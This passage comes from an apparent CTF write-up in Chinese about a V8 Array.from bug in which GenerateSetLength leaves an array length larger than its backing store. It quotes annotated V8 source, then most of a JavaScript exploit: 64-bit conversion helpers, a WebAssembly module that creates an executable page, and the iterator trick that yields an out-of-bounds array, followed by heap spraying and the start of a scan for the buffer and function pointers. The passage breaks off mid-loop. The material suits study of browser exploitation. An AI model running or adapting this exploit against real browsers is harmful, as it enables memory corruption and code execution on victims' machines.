 BIND(&amp;next);</span><br><span class="line">    &#125;</span><br><span class="line">    // Construct the output array with empty length.</span><br><span class="line">    array = ConstructArrayLike(context, args.GetReceiver());</span><br><span class="line">    // Actually get the iterator and throw if the iterator method does not yield</span><br><span class="line">    // one.</span><br><span class="line">    IteratorRecord iterator_record =</span><br><span class="line">        iterator_assembler.GetIterator(context, items, iterator_method);</span><br><span class="line">    TNode&lt;Context&gt; native_context = LoadNativeContext(context);</span><br><span class="line">    TNode&lt;Object&gt; fast_iterator_result_map =</span><br><span class="line">        LoadContextElement(native_context, Context::ITERATOR_RESULT_MAP_INDEX);</span><br><span class="line">    Goto(&amp;loop);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //主要地方在这里</span><br><span class="line">    BIND(&amp;loop);</span><br><span class="line">    &#123;</span><br><span class="line">      // Loop while iterator is not done.</span><br><span class="line">      TNode&lt;Object&gt; next = CAST(iterator_assembler.IteratorStep(</span><br><span class="line">          context, iterator_record, &amp;loop_done, fast_iterator_result_map));</span><br><span class="line">      TVARIABLE(Object, value,</span><br><span class="line">                CAST(iterator_assembler.IteratorValue(</span><br><span class="line">                    context, next, fast_iterator_result_map)));</span><br><span class="line">      // If a map_function is supplied then call it (using this_arg as</span><br><span class="line">      // receiver), on the value returned from the iterator. Exceptions are</span><br><span class="line">      // caught so the iterator can be closed.</span><br><span class="line">      &#123;</span><br><span class="line">        Label next(this);</span><br><span class="line">        GotoIf(IsUndefined(map_function), &amp;next);</span><br><span class="line">        CSA_ASSERT(this, IsCallable(map_function));</span><br><span class="line">        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,</span><br><span class="line">                         this_arg, value.value(), index.value());</span><br><span class="line">        GotoIfException(v, &amp;on_exception, &amp;var_exception);</span><br><span class="line">        value = CAST(v);</span><br><span class="line">        Goto(&amp;next);</span><br><span class="line">        BIND(&amp;next);</span><br><span class="line">      &#125;</span><br><span class="line">      // Store the result in the output object (catching any exceptions so the</span><br><span class="line">      // iterator can be closed).</span><br><span class="line">      Node* define_status =</span><br><span class="line">          CallRuntime(Runtime::kCreateDataProperty, context, array.value(),</span><br><span class="line">                      index.value(), value.value());</span><br><span class="line">      GotoIfException(define_status, &amp;on_exception, &amp;var_exception);</span><br><span class="line"></span><br><span class="line">      //这个index类似于这个循环执行的次数</span><br><span class="line">      index = NumberInc(index.value());</span><br><span class="line">      // The spec requires that we throw an exception if index reaches 2^53-1,</span><br><span class="line">      // but an empty loop would take &gt;100 days to do this many iterations. To</span><br><span class="line">      // actually run for that long would require an iterator that never set</span><br><span class="line">      // done to true and a target array which somehow never ran out of memory,</span><br><span class="line">      // e.g. a proxy that discarded the values. Ignoring this case just means</span><br><span class="line">      // we would repeatedly call CreateDataProperty with index = 2^53.</span><br><span class="line">      CSA_ASSERT_BRANCH(this, [&amp;](Label* ok, Label* not_ok) &#123;</span><br><span class="line">        BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),</span><br><span class="line">                                           NumberConstant(kMaxSafeInteger), ok,</span><br><span class="line">                                           not_ok);</span><br><span class="line">      &#125;);</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line">    &#125;</span><br><span class="line">    BIND(&amp;loop_done);</span><br><span class="line">    &#123;</span><br><span class="line">      //将index给了length</span><br><span class="line">      length = index;</span><br><span class="line">      Goto(&amp;finished);</span><br><span class="line">    &#125;</span><br><span class="line">    BIND(&amp;on_exception);</span><br><span class="line">    &#123;</span><br><span class="line">      // Close the iterator, rethrowing either the passed exception or</span><br><span class="line">      // exceptions thrown during the close.</span><br><span class="line">      iterator_assembler.IteratorCloseOnException(context, iterator_record,</span><br><span class="line">                                                  &amp;var_exception);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ……</span><br><span class="line"></span><br><span class="line">  BIND(&amp;finished);</span><br><span class="line">  // Finally set the length on the output and return it.</span><br><span class="line">  GenerateSetLength(context, array.value(), length.value());</span><br><span class="line">  args.PopAndReturn(array.value());</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array,</span><br><span class="line">                         TNode&lt;Number&gt; length) &#123;</span><br><span class="line">    Label fast(this), runtime(this), done(this);</span><br><span class="line">    // TODO(delphick): We should be able to skip the fast set altogether, if the</span><br><span class="line">    // length already equals the expected length, which it always is now on the</span><br><span class="line">    // fast path.</span><br><span class="line">    // Only set the length in this stub if</span><br><span class="line">    // 1) the array has fast elements,</span><br><span class="line">    // 2) the length is writable,</span><br><span class="line">    // 3) the new length is equal to the old length.</span><br><span class="line">    // 1) Check that the array has fast elements.</span><br><span class="line">    // TODO(delphick): Consider changing this since it does an an unnecessary</span><br><span class="line">    // check for SMIs.</span><br><span class="line">    // TODO(delphick): Also we could hoist this to after the array construction</span><br><span class="line">    // and copy the args into array in the same way as the Array constructor.</span><br><span class="line">    BranchIfFastJSArray(array, context, &amp;fast, &amp;runtime);</span><br><span class="line">    BIND(&amp;fast);</span><br><span class="line">    &#123;</span><br><span class="line">      TNode&lt;JSArray&gt; fast_array = CAST(array);</span><br><span class="line">      TNode&lt;Smi&gt; length_smi = CAST(length);</span><br><span class="line">      TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array);</span><br><span class="line">      CSA_ASSERT(this, TaggedIsPositiveSmi(old_length));</span><br><span class="line">      // 2) Ensure that the length is writable.</span><br><span class="line">      // TODO(delphick): This check may be redundant due to the</span><br><span class="line">      // BranchIfFastJSArray above.</span><br><span class="line">      EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);</span><br><span class="line">      // 3) If the created array&apos;s length does not match the required length,</span><br><span class="line">      //    then use the runtime to set the property as that will insert holes</span><br><span class="line">      //    into excess elements or shrink the backing store as appropriate.</span><br><span class="line">      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line">      //runtime可以修改数组长度并且重新分配空间</span><br><span class="line">      //但是按照Poc的流程的话，在最后一次迭代的时候，它会将length设置为0</span><br><span class="line">      //也就是最后一次执行这个函数的时候，old_length变成了0，但是length_smi却还是最后一次的index</span><br><span class="line">      //这就导致，runtime不会被执行，会直接结束</span><br><span class="line">      //也就造成了实际长度是0，但是属性中的长度却是index，这就造成了数组越界</span><br><span class="line"></span><br><span class="line">      StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                     length_smi);</span><br><span class="line">      Goto(&amp;done);</span><br><span class="line">    &#125;</span><br><span class="line">    BIND(&amp;runtime);</span><br><span class="line">    &#123;</span><br><span class="line">      CallRuntime(Runtime::kSetProperty, context, static_cast&lt;Node*&gt;(array),</span><br><span class="line">                  CodeStubAssembler::LengthStringConstant(), length,</span><br><span class="line">                  SmiConstant(LanguageMode::kStrict));</span><br><span class="line">      Goto(&amp;done);</span><br><span class="line">    &#125;</span><br><span class="line">    BIND(&amp;done);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>代码很难读，它是用的<code>CodeStubAssembler</code>实现的</p>
<p>尽管各种调用意如其名，但是还是有些许调用摸不着头脑</p>
<p>做题思路就出来了，利用它poc的方式，来造成数组越界进行利用，后面的利用就和其他题一样了</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>我看了看参考链接1中的exp，按照它的利用方法尝试了一下，发现JIT编译js函数的话它的代码段是不可写的</p>
<p>另，各种偏移不知道为什么也和我的不符合，所以就尝试自己的一贯思路，即写wasm代码段的方法</p>
<p>但是，像是oob以及数字经济线下chrome这两题的寻找地址方式均失败，原因未知，好在还是找到了偏移</p>
<p>而且，这一题没有遇到chrome那一题的给backstore赋值失败的问题……</p>
<p>但是gdb的job不能用了，枯了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">'0'</span> + b.toString(<span class="number">16</span>)).substr(<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the hexadecimal representation of the given byte array.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexlify</span>(<span class="params">bytes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> res = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)</span><br><span class="line">        res.push(hex(bytes[i]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.join(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the binary data represented by the given hexdecimal string.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unhexlify</span>(<span class="params">hexstr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hexstr.length % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Invalid hex string"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(hexstr.length / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; hexstr.length; i += <span class="number">2</span>)</span><br><span class="line">        bytes[i/<span class="number">2</span>] = <span class="built_in">parseInt</span>(hexstr.substr(i, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexdump</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> data.BYTES_PER_ELEMENT !== <span class="string">'undefined'</span>)</span><br><span class="line">        data = <span class="built_in">Array</span>.from(data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> lines = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> chunk = data.slice(i, i+<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">var</span> parts = chunk.map(hex);</span><br><span class="line">        <span class="keyword">if</span> (parts.length &gt; <span class="number">8</span>)</span><br><span class="line">            parts.splice(<span class="number">8</span>, <span class="number">0</span>, <span class="string">' '</span>);</span><br><span class="line">        lines.push(parts.join(<span class="string">' '</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lines.join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simplified version of the similarly named python module.</span></span><br><span class="line"><span class="keyword">var</span> Struct = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span></span><br><span class="line">    <span class="keyword">var</span> buffer      = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">var</span> byteView    = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line">    <span class="keyword">var</span> uint32View  = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line">    <span class="keyword">var</span> float64View = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        pack: <span class="function"><span class="keyword">function</span>(<span class="params">type, value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span><br><span class="line">            view[<span class="number">0</span>] = value;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, type.BYTES_PER_ELEMENT);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        unpack: <span class="function"><span class="keyword">function</span>(<span class="params">type, bytes</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Invalid bytearray"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span><br><span class="line">            byteView.set(bytes);</span><br><span class="line">            <span class="keyword">return</span> view[<span class="number">0</span>];</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Available types.</span></span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Tiny module that provides big (64bit) integers.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Copyright (c) 2016 Samuel Groß</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Requires utils.js</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Datatype to represent 64-bit integers.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Internally, the integer is stored as a Uint8Array in little endian byte order.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Int64</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// The underlying byte array.</span></span><br><span class="line">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">typeof</span> v) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'number'</span>:</span><br><span class="line">            v = <span class="string">'0x'</span> + <span class="built_in">Math</span>.floor(v).toString(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'string'</span>:</span><br><span class="line">            <span class="keyword">if</span> (v.startsWith(<span class="string">'0x'</span>))</span><br><span class="line">                v = v.substr(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> (v.length % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">                v = <span class="string">'0'</span> + v;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> bigEndian = unhexlify(v, <span class="number">8</span>);</span><br><span class="line">            bytes.set(<span class="built_in">Array</span>.from(bigEndian).reverse());</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'object'</span>:</span><br><span class="line">            <span class="keyword">if</span> (v <span class="keyword">instanceof</span> Int64) &#123;</span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (v.length != <span class="number">8</span>)</span><br><span class="line">                    <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Array must have excactly 8 elements."</span>);</span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'undefined'</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Int64 constructor requires an argument."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a double whith the same underlying bit representation.</span></span><br><span class="line">    <span class="keyword">this</span>.asDouble = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Check for NaN</span></span><br><span class="line">        <span class="keyword">if</span> (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; (bytes[<span class="number">6</span>] == <span class="number">0xff</span> || bytes[<span class="number">6</span>] == <span class="number">0xfe</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a double"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a javascript value with the same underlying bit representation.</span></span><br><span class="line">    <span class="comment">// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span></span><br><span class="line">    <span class="comment">// due to double conversion constraints.</span></span><br><span class="line">    <span class="keyword">this</span>.asJSValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((bytes[<span class="number">7</span>] == <span class="number">0</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0</span>) || (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a JSValue"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.</span></span><br><span class="line">        <span class="keyword">this</span>.assignSub(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span><br><span class="line">        <span class="keyword">var</span> res = Struct.unpack(Struct.float64, bytes);</span><br><span class="line">        <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the underlying bytes of this number as array.</span></span><br><span class="line">    <span class="keyword">this</span>.bytes = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>.from(bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the byte at the given index.</span></span><br><span class="line">    <span class="keyword">this</span>.byteAt = <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bytes[i];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the value of this number as unsigned hex string.</span></span><br><span class="line">    <span class="keyword">this</span>.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'0x'</span> + hexlify(<span class="built_in">Array</span>.from(bytes).reverse());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Basic arithmetic.</span></span><br><span class="line">    <span class="comment">// These functions assign the result of the computation to their 'this' object.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decorator for Int64 instance operations. Takes care</span></span><br><span class="line">    <span class="comment">// of converting arguments to Int64 instances if required.</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params">f, nargs</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">arguments</span>.length != nargs)</span><br><span class="line">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Not enough arguments for function "</span> + f.name);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">                <span class="keyword">if</span> (!(<span class="built_in">arguments</span>[i] <span class="keyword">instanceof</span> Int64))</span><br><span class="line">                    <span class="built_in">arguments</span>[i] = <span class="keyword">new</span> Int64(<span class="built_in">arguments</span>[i]);</span><br><span class="line">            <span class="keyword">return</span> f.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = -n (two's complement)</span></span><br><span class="line">    <span class="keyword">this</span>.assignNeg = operation(<span class="function"><span class="keyword">function</span> <span class="title">neg</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">            bytes[i] = ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, Int64.One);</span><br><span class="line">    &#125;, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a + b</span></span><br><span class="line">    <span class="keyword">this</span>.assignAdd = operation(<span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> cur = a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">            carry = cur &gt; <span class="number">0xff</span> | <span class="number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a - b</span></span><br><span class="line">    <span class="keyword">this</span>.assignSub = operation(<span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> cur = a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">            carry = cur &lt; <span class="number">0</span> | <span class="number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new Int64 instance with the same bit representation as the provided double.</span></span><br><span class="line">Int64.fromDouble = <span class="function"><span class="keyword">function</span>(<span class="params">d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> bytes = Struct.pack(Struct.float64, d);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Int64(bytes);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return -n (two's complement)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Neg</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignNeg(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a + b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAdd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a - b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignSub(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Some commonly used numbers.</span></span><br><span class="line">Int64.Zero = <span class="keyword">new</span> Int64(<span class="number">0</span>);</span><br><span class="line">Int64.One = <span class="keyword">new</span> Int64(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf = [];</span><br><span class="line"><span class="keyword">let</span> obj = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7f</span>, <span class="number">0x03</span>, <span class="number">0x82</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x83</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x91</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>, <span class="number">0x6d</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x6d</span>, <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0a</span>, <span class="number">0x8a</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x2a</span>, <span class="number">0x0b</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">        oobArray.length = <span class="number">1</span>;</span><br><span class="line">        buf.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1234</span>));</span><br><span class="line">        <span class="keyword">let</span> o = &#123;<span class="attr">a</span>:<span class="number">0xdead</span>, <span class="attr">b</span>:func&#125;;</span><br><span class="line">        obj.push(o)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1000000</span>);</span><br><span class="line">&#125;</span><br><span class="line">oob_2_backstore_offset = <span class="number">0</span>;</span><br><span class="line">func_ptr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;maxSize;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> val = 